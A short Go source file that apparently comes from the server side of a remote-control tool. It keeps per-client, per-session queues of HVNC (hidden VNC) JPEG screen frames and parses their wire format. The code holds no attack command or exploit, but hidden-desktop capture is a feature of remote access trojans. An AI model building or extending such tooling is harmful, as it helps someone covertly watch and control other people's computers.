package command

import (
	"encoding/binary"
	"strings"
	"sync"
)

// HVNCFrameQueue HVNC 帧队列（按 uid + sessionId 维度，满帧替换）
type HVNCFrameQueue struct {
	mu     sync.RWMutex
	queues map[string]chan []byte // key: uid + "|" + sid
}

// VarHVNCFrameQueue 全局 HVNC 帧队列
var VarHVNCFrameQueue = &HVNCFrameQueue{queues: make(map[string]chan []byte)}

// queueKey 组合 uid 与 sid
func queueKey(uid, sid string) string { return uid + "|" + sid }

// GetOrCreateQueue 获取或创建会话帧队列
func (q *HVNCFrameQueue) GetOrCreateQueue(uid, sid string) chan []byte {
	key := queueKey(uid, sid)
	q.mu.Lock()
	defer q.mu.Unlock()
	if ch, ok := q.queues[key]; ok {
		return ch
	}
	ch := make(chan []byte, 5)
	q.queues[key] = ch
	return ch
}

// Add 添加一帧（满则清旧换新帧，保证拿到最新画面）
// I2: 锁内非阻塞发送（原锁外 send 与 Remove 锁内 close 竞态 → send on closed channel panic）
func (q *HVNCFrameQueue) Add(uid, sid string, frame []byte) {
	key := queueKey(uid, sid)
	q.mu.Lock()
	defer q.mu.Unlock()

	ch, ok := q.queues[key]
	if !ok {
		ch = make(chan []byte, 5)
		q.queues[key] = ch
	}
	select {
	case ch <- frame:
	default:
		// 队列满，丢弃最旧帧
		select {
		case <-ch:
		default:
		}
		select {
		case ch <- frame:
		default:
		}
	}
}

// Get 取一帧（非阻塞）
func (q *HVNCFrameQueue) Get(uid, sid string) ([]byte, bool) {
	key := queueKey(uid, sid)
	q.mu.RLock()
	ch, ok := q.queues[key]
	q.mu.RUnlock()
	if !ok {
		return nil, false
	}
	select {
	case frame := <-ch:
		return frame, true
	default:
		return nil, false
	}
}

// Remove 移除会话队列
func (q *HVNCFrameQueue) Remove(uid, sid string) {
	key := queueKey(uid, sid)
	q.mu.Lock()
	defer q.mu.Unlock()
	if ch, ok := q.queues[key]; ok {
		close(ch)
		delete(q.queues, key)
	}
}

// ParseHVNCFrame 解析 HVNC 帧载荷: [4B sidLen][sessionId][JPEG 数据]
func ParseHVNCFrame(data []byte) (sid string, jpeg []byte, ok bool) {
	if len(data) < 4 {
		return "", nil, false
	}
	sidLen := int(binary.BigEndian.Uint32(data[:4]))
	if sidLen <= 0 || 4+sidLen > len(data) {
		return "", nil, false
	}
	return string(data[4 : 4+sidLen]), data[4+sidLen:], true
}
// RemoveByUid 删除指定客户端的所有 HVNC 帧通道（key 为 uid|sid，断线时调用）
func (q *HVNCFrameQueue) RemoveByUid(uid string) {
	q.mu.Lock()
	defer q.mu.Unlock()
	for key := range q.queues {
		if strings.HasPrefix(key, uid+"|") {
			delete(q.queues, key)
		}
	}
}
